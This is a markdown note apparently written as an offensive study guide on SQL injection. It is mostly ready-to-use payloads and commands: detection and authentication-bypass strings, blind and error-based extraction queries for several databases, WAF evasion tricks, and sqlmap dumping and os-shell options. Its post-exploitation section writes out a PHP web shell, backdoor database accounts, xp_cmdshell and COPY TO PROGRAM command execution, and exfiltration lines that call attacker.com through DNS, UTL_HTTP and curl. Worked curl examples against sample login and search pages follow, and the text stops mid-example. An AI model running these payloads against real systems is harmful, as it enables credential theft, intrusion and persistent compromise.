---
title: SQL Injection
tags: [sql, notes]
description: input in SQL queries to manipulate the database
date: 2025-09-15
---
# PART 1: DETAILED SUMMARY NOTES

## 1.1 Core Concepts & Definitions

**SQL Injection (SQLi):** Exploiting unsanitized user input in SQL queries to manipulate the database, extract or alter data, and possibly achieve remote code execution or system takeover.

### SQL Injection Types

**In-Band SQLi (Classic):**
- **Error-Based SQLi:** Forcing database error messages to leak sensitive information
- **Union-Based SQLi:** Appending additional SELECT statements with UNION to extract data from other tables

**Inferential SQLi (Blind):**
- **Boolean-Based Blind SQLi:** Exploiting situations where the app doesn't display SQL results or errors. Uses conditional responses to infer data
- **Time-Based Blind SQLi:** Inferring data by triggering database delays and analyzing response times

**Out-of-Band SQLi:**
- Data exfiltration via DNS or HTTP requests to external domains

**Second-Order SQLi:**
- Payload stored in the database becomes dangerous later when used in subsequent queries

### Common Injection Points
- URL parameters (GET/POST)
- Form fields (login, search, contact forms)
- HTTP headers (User-Agent, Referer, Cookie)
- Cookies
- JSON/XML request bodies
- File upload parameters

## 1.2 Attack Methodology Overview (Kill Chain Stages)

### Stage 1: Reconnaissance
- Map all application endpoints
- Identify parameters that interact with database
- Document input validation mechanisms
- Fingerprint web server and application technology

### Stage 2: Enumeration
- Test parameters for SQL injection vulnerabilities
- Determine database management system (DBMS)
- Identify injection type (error-based, union-based, blind)
- Fingerprint database version

### Stage 3: Exploitation
- Extract database structure (tables, columns)
- Dump sensitive data (credentials, user data)
- Escalate privileges if possible
- Attempt remote code execution

### Stage 4: Post-Exploitation
- Establish persistence mechanisms
- Pivot to other systems
- Cover tracks (clear logs if possible)
- Document findings for reporting

## 1.3 Tool Setup and Configuration

### SQLmap Configuration
**Installation:**
```bash
# Ubuntu/Debian
sudo apt install sqlmap

# Using pip
pip install sqlmap

# From source
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

**Basic Configuration:**
```bash
# Test single URL
sqlmap -u "http://target.com/page.php?id=1"

# Use cookie authentication
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Use custom headers
sqlmap -u "http://target.com/page.php?id=1" -H "X-Forwarded-For: 127.0.0.1"

# Load request from file
sqlmap -r request.txt

# Use proxy (Burp Suite)
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Batch mode (non-interactive)
sqlmap -u "http://target.com/page.php?id=1" --batch

# Risk and level configuration
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3

# Specify techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
# B=Boolean-based blind
# E=Error-based
# U=Union query-based
# S=Stacked queries
# T=Time-based blind
# Q=Inline queries
```

### Burp Suite Configuration
**SQLi Testing Workflow:**
- Enable Proxy → Intercept requests
- Send interesting requests to Repeater
- Use Intruder for parameter fuzzing
- Install extensions: SQLiPy, SQL Inject Me
- Configure Scanner for automated detection

**Recommended Settings:**
- Proxy → Options → Intercept Client Requests
- Add to scope: Target URLs
- Scanner → Scan Configuration → SQL Injection checks enabled

### OWASP ZAP Configuration
```bash
# Active scan
zap-cli quick-scan --spider -r http://target.com

# API scan with authentication
zap-cli quick-scan --spider -r http://target.com -c "session=abc123"
```

## 1.4 In-Depth Exploitation Steps

### Step 1: Identify Injection Point
**Test every parameter, header, cookie, and body value for injection.**

**Common indicators:**
- Single quote `'` or double quote `"` causes errors or different responses
- SQL keywords (`AND`, `OR`, `SELECT`) change behavior
- Comments (`--`, `#`, `/* ... */`) alter responses
- Delays with `SLEEP()`/`WAITFOR DELAY` confirm vulnerability

**Basic Detection Payloads:**
```sql
-- Test for error responses
'
"
`
')
")
`)

-- Boolean-based detection
' OR 1=1--
' OR '1'='1
' OR 1=1#
' OR 1=1/*

-- Comment injection
'--
'#
'/*

-- Arithmetic operations
' AND 1=1--
' AND 1=2--
```

### Step 2: Enumerate Database Structure

**Find Column Count:**
```sql
-- Method 1: ORDER BY
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continue until error is returned

-- Method 2: UNION SELECT NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- Continue until no error
```

**Identify String Columns:**
```sql
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```

**Database Type Fingerprinting:**

| Database | Version Query | Comment Syntax | Sleep Function |
|----------|--------------|----------------|----------------|
| MySQL | `SELECT @@version` | `#`, `--`, `/* */` | `SLEEP(10)` |
| MSSQL | `SELECT @@version` | `--`, `/* */` | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT version()` | `--`, `/* */` | `pg_sleep(10)` |
| Oracle | `SELECT banner FROM v$version` | `--` | `dbms_pipe.receive_message(('a'),10)` |
| SQLite | `SELECT sqlite_version()` | `--`, `/* */` | N/A |

**Database Version Detection:**
```sql
-- MySQL
' UNION SELECT @@version,NULL,NULL--
' UNION SELECT version(),NULL,NULL--

-- MSSQL
' UNION SELECT @@version,NULL,NULL--

-- PostgreSQL
' UNION SELECT version(),NULL,NULL--

-- Oracle
' UNION SELECT banner,NULL FROM v$version--

-- SQLite
' UNION SELECT sqlite_version(),NULL,NULL--
```

### Step 3: Extract Data

**Enumerate Tables:**
```sql
-- MySQL/MSSQL/PostgreSQL
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- Oracle
' UNION SELECT table_name,NULL FROM all_tables--

-- SQLite
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

**Enumerate Columns:**
```sql
-- MySQL/MSSQL/PostgreSQL
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--

-- Oracle
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

-- SQLite
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
```

**Extract Data:**
```sql
-- Basic data extraction
' UNION SELECT username,password,NULL FROM users--

-- Concatenate multiple columns
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--

-- MySQL concatenation
' UNION SELECT CONCAT_WS(':',username,password),NULL,NULL FROM users--

-- MSSQL concatenation
' UNION SELECT username+':'+password,NULL,NULL FROM users--

-- PostgreSQL concatenation
' UNION SELECT username||':'||password,NULL,NULL FROM users--

-- Oracle concatenation
' UNION SELECT username||':'||password,NULL FROM users--
```

### Step 4: Attack Types & Advanced Payloads

**Authentication Bypass:**
```sql
-- Classic bypasses
' OR '1'='1'--
' OR 1=1--
admin'--
admin'#
' OR 'x'='x
') OR ('x'='x

-- Advanced bypasses
admin' OR '1'='1'/*
' OR 1=1 LIMIT 1--
'=''or'
' UNION SELECT 'admin',NULL,NULL--
```

**Boolean-Based Blind SQLi:**
```sql
-- Basic true/false conditions
' AND 1=1--  (returns normal result)
' AND 1=2--  (returns no result/error)

-- Character extraction
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--

-- MySQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

-- MSSQL
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

-- PostgreSQL
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--

-- Oracle
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--
```

**Time-Based Blind SQLi:**
```sql
-- MySQL
' OR IF(1=1,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--

-- MSSQL
' IF(1=1) WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' AND IF(1=1,WAITFOR DELAY '0:0:5',0)--

-- PostgreSQL
' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' OR dbms_pipe.receive_message(('a'),10)='a'--
'; BEGIN DBMS_LOCK.SLEEP(5); END;--
```

**Error-Based SQLi:**
```sql
-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--

-- MSSQL
' UNION SELECT 1/0--
' AND 1=CONVERT(int,(SELECT @@version))--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--

-- Oracle
' UNION SELECT TO_CHAR(1/0) FROM dual--
' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS int)--
```

**Union-Based SQLi (Advanced):**
```sql
-- Multiple row extraction
' UNION SELECT GROUP_CONCAT(username,':',password) FROM users--

-- MySQL
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--

-- MSSQL (XML PATH)
' UNION SELECT STUFF((SELECT ',' + username FROM users FOR XML PATH('')),1,1,'')--

-- PostgreSQL (string_agg)
' UNION SELECT string_agg(username,',') FROM users--

-- Oracle (LISTAGG)
' UNION SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM users--
```

**Stacked Queries:**
```sql
-- MSSQL/PostgreSQL (Not supported on MySQL by default)
'; DROP TABLE users--
'; INSERT INTO users VALUES ('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- MSSQL command execution
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
```

**Out-of-Band (OOB) Exfiltration:**
```sql
-- MySQL (LOAD_FILE with UNC path - Windows only)
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))--

-- MSSQL (DNS exfiltration)
'; DECLARE @data varchar(1024); SELECT @data=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\\\'+@data+'.attacker.com\\\\a"')--

-- Oracle (UTL_HTTP)
' UNION SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--

-- PostgreSQL (COPY TO PROGRAM)
'; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com?data=$(cat)'--
```

## 1.5 Defensive Indicators and Red Flags

### Server-Side Indicators
**Error Messages:**
- SQL syntax errors visible in HTTP response
- Database-specific error messages (MySQL, MSSQL, PostgreSQL)
- Stack traces revealing query structure

**Behavioral Changes:**
- Different content length for true/false conditions
- Response time delays matching sleep commands
- Different HTTP status codes (500, 200, 403)
- Changes in page structure or content

**Example Error Messages:**
```
MySQL:
  You have an error in your SQL syntax near...
  Warning: mysql_fetch_array()...
  
MSSQL:
  Unclosed quotation mark after the character string...
  Incorrect syntax near...
  
PostgreSQL:
  ERROR: syntax error at or near...
  ERROR: unterminated quoted string...
  
Oracle:
  ORA-00933: SQL command not properly ended
  ORA-01756: quoted string not properly terminated
```

### Client-Side Detection
**IDS/IPS Signatures:**
- Malicious patterns: `OR 1=1`, `UNION SELECT`, `SLEEP(`
- SQL keywords in unusual contexts
- Comment syntax in parameters
- Encoded SQL payloads

**WAF Detection:**
- Request blocked messages
- Generic error pages
- Suspicious captchas
- Token/session invalidation

## 1.6 Common Hurdles and Mitigation Bypasses

### Prepared Statements (Parameterized Queries)
**Bypass Strategies:**
- Look for alternate injection points (headers, cookies)
- Test for second-order injection
- Exploit dynamic query construction
- Target stored procedures with dynamic SQL

### Input Validation Filters
**Bypass Techniques:**
- Encoding variations (URL, Unicode, Hex)
- Case manipulation
- Inline comments
- Alternative syntax
- Multi-byte character exploits

### Web Application Firewalls (WAF)
**Common WAF Bypass Methods:**
```sql
-- Space replacement
UNION/**/SELECT
UNION%0ASELECT
UNION%09SELECT

-- Inline comments
UN/**/ION SE/**/LECT

-- Case variation
uNiOn sElEcT

-- Double encoding
%2527%252520UNION%252520SELECT

-- Parentheses
UNION(SELECT(username)FROM(users))

-- Alternative operators
' OR 6=6--
' OR 'a'LIKE'a

-- Character encoding
UNION%53ELECT  (hex for S=53)
CHAR(85,78,73,79,78)  -- UNION

-- Comment obfuscation
'/**/OR/**/1=1--
```

### Character Encoding Exploits
```sql
-- UTF-8 overlong encoding
%C0%27  -- Single quote
%C0%A7  -- Single quote alternative

-- Multi-byte character set exploits (GBK)
%DF%27  -- Becomes valid character + quote in GBK

-- Unicode normalization
%u0027  -- Single quote
%u02bc  -- Modifier letter apostrophe
```

### Length Limitations
**Bypass Strategies:**
```sql
-- Shorten payloads
'OR1=1--  (remove spaces)
'||1--    (alternative OR)

-- Use aliases
SELECT*FROM(SELECT(1))a

-- Subquery optimization
'||(SELECT(password)FROM(users))--
```

# PART 2: RAPID-REFERENCE CHEATSHEET

## 2.1 Command Syntax & Quick Reference

### Basic Detection Payloads
```sql
-- Error-based detection
'
"
`
')
")
`)

-- Boolean-based
' OR 1=1--
' AND 1=1--
' OR 'a'='a
' AND 'a'='a

-- Comment injection
'--
'#
'/*
```

### Database Fingerprinting
```sql
-- MySQL
' UNION SELECT @@version,NULL--
' AND SLEEP(5)--

-- MSSQL
' UNION SELECT @@version,NULL--
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' UNION SELECT version(),NULL--
'; SELECT pg_sleep(5)--

-- Oracle
' UNION SELECT banner FROM v$version WHERE rownum=1--
' AND dbms_pipe.receive_message(('a'),5)=1--

-- SQLite
' UNION SELECT sqlite_version(),NULL--
```

### Column Enumeration
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continue until error

-- Alternative method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Data Extraction (Union-Based)
```sql
-- MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- MSSQL
' UNION SELECT name,NULL FROM sys.tables--
' UNION SELECT name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--

-- PostgreSQL
' UNION SELECT tablename,NULL FROM pg_tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Oracle
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

### Authentication Bypass
```sql
admin'--
admin'#
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1
') OR ('1'='1
' OR 'x'='x
```

### Time-Based Blind Extraction
```sql
-- MySQL
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)))>100 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END IS NOT NULL--
```

### File Operations
```sql
-- MySQL - Read file
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- MySQL - Write file
' UNION SELECT 'shell code',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL - Read file
'; EXEC xp_cmdshell 'type C:\\boot.ini'--

-- PostgreSQL - Read file
'; COPY (SELECT '') TO PROGRAM 'cat /etc/passwd'--

-- PostgreSQL - Write file
'; COPY (SELECT 'shell code') TO '/tmp/shell.php'--
```

### Command Execution
```sql
-- MSSQL
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

-- MySQL (User Defined Functions)
-- Requires FILE privilege and plugin directory access
'; SELECT * FROM mysql.func--

-- PostgreSQL
'; COPY (SELECT '') TO PROGRAM 'whoami'--
'; CREATE TABLE cmd(cmd_output text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd--
```

## 2.2 SQLmap Quick Reference

### Basic Usage
```bash
# Simple scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/page" --data="id=1&name=test"

# From Burp request file
sqlmap -r request.txt

# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Specify parameter
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# Test all parameters
sqlmap -u "http://target.com/page?id=1&cat=2" --level=5 --risk=3
```

### Enumeration Commands
```bash
# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Current database
sqlmap -u "http://target.com/page?id=1" --current-db

# List tables in database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dump-all

# Search for columns
sqlmap -u "http://target.com/page?id=1" --search -C password
```

### Advanced Options
```bash
# Specify technique
sqlmap -u "http://target.com/page?id=1" --technique=BEUST
# B=Boolean-based blind
# E=Error-based
# U=Union query-based
# S=Stacked queries
# T=Time-based blind

# Increase verbosity
sqlmap -u "http://target.com/page?id=1" -v 3

# Use proxy (Burp)
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Random User-Agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase

# Threads (speed)
sqlmap -u "http://target.com/page?id=1" --threads=10

# Batch mode (non-interactive)
sqlmap -u "http://target.com/page?id=1" --batch

# Time delay
sqlmap -u "http://target.com/page?id=1" --time-sec=10

# OS command execution
sqlmap -u "http://target.com/page?id=1" --os-cmd="whoami"

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Tamper Scripts
```bash
# Common tamper scripts
--tamper=space2comment         # Replace space with /**/
--tamper=randomcase            # Random case for keywords
--tamper=space2plus            # Replace space with +
--tamper=between               # Replace > with NOT BETWEEN 0 AND #
--tamper=charencode            # Encode characters
--tamper=apostrophemask        # Replace apostrophe with UTF-8
--tamper=base64encode          # Base64 encode payload
--tamper=htmlencode            # HTML encode payload

# Multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase,charencode
```

## 2.3 Enumeration Checklist

### Port/Service Enumeration
- **Port 80** → HTTP → Web application testing
- **Port 443** → HTTPS → Same as port 80, with SSL
- **Port 8080** → Alt HTTP → Development servers, proxies
- **Port 8443** → Alt HTTPS → Tomcat, Jenkins
- **Port 3306** → MySQL → Direct database connection
- **Port 1433** → MSSQL → Direct database connection
- **Port 5432** → PostgreSQL → Direct database connection
- **Port 1521** → Oracle → Direct database connection

### Input Vector Checklist
- ✓ GET parameters → `?id=<payload>`
- ✓ POST parameters → `name=<payload>`
- ✓ URL path segments → `/user/<payload>/profile`
- ✓ HTTP headers → User-Agent, Referer, X-Forwarded-For
- ✓ Cookies → `session=<payload>`
- ✓ JSON body → `{"key":"<payload>"}`
- ✓ XML body → `<name><payload></name>`
- ✓ File upload parameters → `filename=<payload>`
- ✓ WebSocket messages → `{"msg":"<payload>"}`
- ✓ GraphQL queries → `query { user(id: "<payload>") }`

### Parameter Testing Workflow
1. Submit canary value: `TEST_12345`
2. Check reflection in response
3. Test with single quote: `'`
4. Test with SQL keywords: `' OR 1=1--`
5. Test with time delay: `' OR SLEEP(5)--`
6. Confirm vulnerability
7. Enumerate database structure
8. Extract data

## 2.4 Decision Trees / If-Then Flows

### Detection Decision Tree
```
IF parameter causes error with single quote (')
  → Test Boolean-based: ' OR 1=1--
  
  IF different response for true/false conditions
    → Boolean-based SQLi confirmed
    → Extract data character by character
  
  ELIF response has time delay with SLEEP/WAITFOR
    → Time-based SQLi confirmed
    → Extract data with conditional delays
  
  ELIF database error messages visible
    → Error-based SQLi confirmed
    → Extract data via error messages

IF no visible errors
  → Test time-based blind: ' OR IF(1=1,SLEEP(5),0)--
  
  IF response delayed by ~5 seconds
    → Time-based blind SQLi confirmed
    → Use conditional time delays to extract data
  
  ELSE
    → Test second-order injection
    → Test alternate parameters/headers
```

### Exploitation Decision Tree
```
IF SQLi confirmed
  → Enumerate database type
  
  IF MySQL detected
    → Use # for comments
    → Use SLEEP() for time delays
    → Use information_schema for enumeration
    → Attempt LOAD_FILE for file read
    → Attempt INTO OUTFILE for file write
  
  ELIF MSSQL detected
    → Use -- for comments
    → Use WAITFOR DELAY for time delays
    → Use sys.tables for enumeration
    → Attempt xp_cmdshell for command execution
  
  ELIF PostgreSQL detected
    → Use -- for comments
    → Use pg_sleep() for time delays
    → Use information_schema for enumeration
    → Attempt COPY TO PROGRAM for command execution
  
  ELIF Oracle detected
    → Use -- for comments
    → Use dbms_pipe.receive_message for delays
    → Use all_tables for enumeration
    → Attempt UTL_FILE for file operations
```

### WAF Bypass Decision Tree
```
IF payload blocked by WAF
  → Try inline comments: UN/**/ION SE/**/LECT
  
  IF still blocked
    → Try case variation: uNiOn sElEcT
    
    IF still blocked
      → Try encoding: %55NION %53ELECT
      
      IF still blocked
        → Try alternative syntax: ' OR 6=6--
        
        IF still blocked
          → Try tamper scripts: --tamper=space2comment,randomcase
          
          IF still blocked
            → Try out-of-band techniques
            → Consider second-order injection
```

## 2.5 WAF/IDS Evasion Techniques

### Space Replacement
```sql
-- Comment replacement
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

-- Plus sign
UNION+SELECT

-- Newline
UNION%0ASELECT

-- Tab
UNION%09SELECT

-- Alternative whitespace
UNION%0BSELECT
UNION%0CSELECT
UNION%0DSELECT
UNION%A0SELECT
```

### Case Variation
```sql
UnIoN SeLeCt
uNiOn sElEcT
UNION select
union SELECT
```

### Character Encoding
```sql
-- URL encoding
%55NION %53ELECT  -- UNION SELECT
%75%6e%69%6f%6e%20%73%65%6c%65%63%74

-- Double URL encoding
%2555NION %2553ELECT

-- Unicode encoding
\u0055NION \u0053ELECT

-- Hex encoding
0x55NION 0x53ELECT

-- CHAR function
CHAR(85,78,73,79,78,32,83,69,76,69,67,84)
```

### Comment Obfuscation
```sql
-- Inline comments
UN/*comment*/ION/**/SE/**/LECT

-- Multiline comments
UN/*
multi
line
*/ION

-- Version-specific comments (MySQL)
/*!50000UNION*/ /*!50000SELECT*/

-- Conditional comments
/*! UNION */ /*! SELECT */
```

### Alternative Operators
```sql
-- OR alternatives
||
UNION
' OR 'a'='a
' OR 6=6--

-- AND alternatives
&&
' AND 'a'='a
' AND 6=6--

-- Equal alternatives
LIKE
RLIKE
REGEXP
IN
```

### Parentheses Abuse
```sql
UNION(SELECT(column)FROM(table))
' OR(1)=(1)--
' AND(SELECT(1)FROM(dual))--
```

### Null Byte Injection
```sql
UNION%00SELECT
SELECT%00*%00FROM%00users
'%00OR%001=1--
```

## 2.6 Post-Exploitation Shortcuts

### Credential Extraction
```sql
-- Dump username and password
' UNION SELECT username,password FROM users--

-- Concatenate credentials
' UNION SELECT CONCAT(username,':',password) FROM users--

-- Multiple rows (MySQL)
' UNION SELECT GROUP_CONCAT(username,':',password) FROM users--

-- Multiple rows (MSSQL)
' UNION SELECT STRING_AGG(username+':'+password,',') FROM users--

-- Multiple rows (PostgreSQL)
' UNION SELECT string_agg(username||':'||password,',') FROM users--
```

### Privilege Escalation
```sql
-- MySQL - Create admin user
'; INSERT INTO users (username,password,role) VALUES ('hacker','password','admin')--

-- MSSQL - Add user to sysadmin
'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--

-- MySQL - Grant all privileges
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--
```

### File System Access
```sql
-- Read sensitive files
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),NULL--

-- Write web shell
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- List directory (MSSQL)
'; EXEC xp_cmdshell 'dir C:\\'--

-- List directory (PostgreSQL)
'; COPY (SELECT '') TO PROGRAM 'ls -la /var/www/html'--
```

### Database Backdoor
```sql
-- MySQL - Create backdoor user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';

-- MSSQL - Create login
CREATE LOGIN backdoor WITH PASSWORD = 'Password123!';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

-- PostgreSQL - Create superuser
CREATE USER backdoor WITH PASSWORD 'password' SUPERUSER;
```

### Data Exfiltration
```sql
-- Export to file (MySQL)
' UNION SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--

-- Export via DNS (MSSQL)
'; DECLARE @data varchar(max); SELECT @data=COALESCE(@data+'.','')+(username+'-'+password) FROM users; EXEC('xp_dirtree "\\'+@data+'.attacker.com\\a"')--

-- Export via HTTP (MSSQL)
'; DECLARE @data varchar(max); SELECT @data=(SELECT * FROM users FOR XML PATH('')); EXEC('master..xp_cmdshell ''curl http://attacker.com?data='+@data+'''')--
```

# PART 3: REAL-WORLD EXAMPLES & USAGE SCENARIOS

## Example 1: Union-Based SQL Injection in Search Function
**Target:** `http://vulnerable-site.com/search?q=test`

**Step 1 - Detection:**
```bash
# Test for error
curl "http://vulnerable-site.com/search?q=test'"

# Response: "You have an error in your SQL syntax"
```

**Step 2 - Find Column Count:**
```bash
# Test ORDER BY
curl "http://vulnerable-site.com/search?q=test' ORDER BY 1--+"
curl "http://vulnerable-site.com/search?q=test' ORDER BY 2--+"
curl "http://vulnerable-site.com/search?q=test' ORDER BY 3--+"
# Error at 4, so 3 columns
```

**Step 3 - Identify String Columns:**
```bash
curl "http://vulnerable-site.com/search?q=test' UNION SELECT 'a',NULL,NULL--+"
curl "http://vulnerable-site.com/search?q=test' UNION SELECT NULL,'a',NULL--+"
curl "http://vulnerable-site.com/search?q=test' UNION SELECT NULL,NULL,'a'--+"
# All columns accept strings
```

**Step 4 - Enumerate Database:**
```bash
# Get database version
curl "http://vulnerable-site.com/search?q=test' UNION SELECT @@version,NULL,NULL--+"

# Get database name
curl "http://vulnerable-site.com/search?q=test' UNION SELECT database(),NULL,NULL--+"

# List tables
curl "http://vulnerable-site.com/search?q=test' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--+"

# List columns in users table
curl "http://vulnerable-site.com/search?q=test' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--+"
```

**Step 5 - Extract Data:**
```bash
# Dump credentials
curl "http://vulnerable-site.com/search?q=test' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL FROM users--+"
```

**Using SQLmap:**
```bash
# Automated exploitation
sqlmap -u "http://vulnerable-site.com/search?q=test" --batch --dbs
sqlmap -u "http://vulnerable-site.com/search?q=test" -D database_name --tables
sqlmap -u "http://vulnerable-site.com/search?q=test" -D database_name -T users --dump
```

## Example 2: Time-Based Blind SQL Injection in Login Form
**Target:** Login form at `http://bank-app.com/login`

**Vulnerable Code:**
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

**Step 1 - Confirm Vulnerability:**
```bash
# Test time delay
curl -X POST "http://bank-app.com/login" \
  -d "username=admin' AND SLEEP(5)--&password=test"

# Response delayed by 5 seconds = vulnerable
```

**Step 2 - Extract Data Length:**
```bash
# Test password length
curl -X POST "http://bank-app.com/login" \
  -d "username=admin' AND IF(LENGTH(password)=32,SLEEP(5),0)--&password=test"

# If delayed, password is 32 characters
```

**Step 3 - Extract Data Character by Character:**
```bash
# Extract first character
curl -X POST "http://bank-app.com/login" \
  -d "username=admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--&password=test"

# Extract second character
curl -X POST "http://bank-app.com/login" \
  -d "username=admin' AND IF(SUBSTRING(password,2,1)='b',SLEEP(5),0)--&password=test"

# Continue for all 32 characters...
```

**Using SQLmap:**
```bash
# Capture request in Burp and save to file
sqlmap -r login_request.txt --technique=T --time-sec=5 --batch -D database_name -T users --dump
```

## Example 3: Error-Based SQL Injection with WAF Bypass
**Target:** `http://waf-protected.com/product?id=1`

**Step 1 - Detect WAF:**
```bash
# Standard payload blocked
curl "http://waf-protected.com/product?id=1' UNION SELECT NULL--"
# Response: "Malicious request detected"
```

**Step 2 - Bypass with Inline Comments:**
```bash
curl "http://waf-protected.com/product?id=1'/**/UNION/**/SELECT/**/NULL--+"
# Still blocked
```

**Step 3 - Bypass with Case Variation:**
```bash
curl "http://waf-protected.com/product?id=1'/**/uNiOn/**/sElEcT/**/NULL--+"
# Still blocked
```

**Step 4 - Bypass with Encoding:**
```bash
curl "http://waf-protected.com/product?id=1'/**/UNION/**/SELECT/**/%4e%55%4c%4c--+"
# Success!
```

**Step 5 - Error-Based Extraction:**
```bash
# Extract database version
